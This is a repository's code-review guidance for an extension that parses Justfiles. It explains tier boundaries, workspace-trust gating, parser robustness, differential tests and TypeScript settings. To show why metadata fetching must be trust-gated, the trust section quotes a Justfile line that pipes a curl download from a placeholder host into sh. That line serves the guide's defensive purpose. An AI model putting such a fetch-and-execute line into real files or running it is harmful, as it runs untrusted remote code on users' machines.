# Review guidance

This repository has an unusually sharp architectural boundary, and most serious defects here are
violations of it rather than ordinary bugs. The structured rules in `config.json` cover the
mechanical checks. This file explains the reasoning, so a reviewer can judge the cases the rules
do not literally name.

## The two tiers

| | Tier 1 — `src/parser`, `src/model` | Tier 2 — the `just` CLI |
|---|---|---|
| Runs | Every keystroke | On demand, trusted workspaces only |
| Owns | Highlighting, outline, completion, navigation, folding | Diagnostics, canonical metadata, formatting |
| Budget | Sub-millisecond, zero I/O, zero subprocesses | Subprocess, cached, single-flight |

A change that moves responsibility across that line is a significant change even when it is only
a few lines of code, and should be called out as such.

## Why Tier 1 never reports a semantic error

The tempting shortcut is to have the parser check things it plainly can see — that a dependency
names a recipe which exists, that an attribute is one `just` recognises, that a recipe is called
with the right number of arguments. Every one of those is forbidden.

The reason is not purity. It is that reimplementing `just`'s semantics in TypeScript guarantees
divergence, divergence surfaces as false positives, and a false positive is far more expensive
than a missed error. A missing squiggle is invisible. A red squiggle on a Justfile that `just`
runs happily makes the user distrust every other diagnostic the extension emits, including the
correct ones.

So when reviewing: a new check in the parser that *looks* obviously right is exactly the change
to push back on. Ask whether `just` could ever disagree. If it could, the check belongs in
Tier 2 or nowhere.

## Why trust gating is not ordinary defensive coding

`just` evaluates backticks and the `shell()` function when it *parses* a file, not when it runs
a recipe. A Justfile containing:

```just
version := `curl -s https://example.com/x | sh`
```

executes that command the moment `just --dump` touches the file. Fetching metadata is arbitrary
code execution.

This means a missing trust check is not a hardening gap, it is a remote code execution path that
triggers on opening a folder. Treat any ungated spawn as high severity, including in code paths
that "obviously" only run when trusted — trust can be revoked, and the next caller copies the
pattern.

The same applies to `just.executablePath`: a workspace-scoped setting naming a binary to execute
is itself the payload, so it must be ignored when the workspace is untrusted.

## Why the parser must be total

The parser runs against a buffer the user is actively typing into, which means it spends most of
its life looking at syntactically invalid input. Half a recipe is the normal case, not the edge
case.

An exception or a null return there does not produce a graceful failure — it removes the outline,
the highlighting, and the navigation at precisely the moment the user is mid-edit and needs them.
An unbounded loop is worse still: it hangs the extension host.

So `throw` on the parse path, a nullable return, or a loop without a guaranteed cursor advance
are all correctness bugs, not robustness nits.

## Why parser changes need a differential fixture

Unit tests encode the author's belief about how `just` behaves. Differential fixtures encode how
`just` actually behaves, and keep checking after the next upstream release.

The distinction is not theoretical. The first run of this harness caught two real defects that
had passed code review and would have passed any unit test written from the same understanding:
a newline after a comment was silently clearing every doc comment, and `just` turned out to use
only the last comment line above an item rather than the whole block.

When a PR changes what the parser produces and adds no fixture, say so. When a PR makes a
differential test pass by loosening the comparison rather than fixing the parser, say so more
loudly — that is the one change that quietly disables the safety net everything else relies on.

## TypeScript here is not ordinary TypeScript

`erasableSyntaxOnly` is on, so `enum`, `namespace` and constructor parameter properties are
compile errors. The codebase uses a frozen object plus a derived union in place of enums:

```ts
export const TokenKind = { Colon: ":", Comma: "," } as const;
export type TokenKind = (typeof TokenKind)[keyof typeof TokenKind];
```

Also on: `verbatimModuleSyntax` (type imports need `import type`), `noUncheckedIndexedAccess`
(`arr[i]` is `T | undefined` — the most common way a parser stops being total is indexing past
the end of a token stream), and `exactOptionalPropertyTypes`.

Biome, not ESLint, handles lint and format. It does **not** do type-aware linting, so
`no-floating-promises` does not exist here — an un-awaited promise in the activation path will
not be caught by tooling and is worth flagging by eye.

## What not to comment on

Formatting, import order, quote style and naming are enforced deterministically by Biome in CI.
Comments on those add noise without adding information.
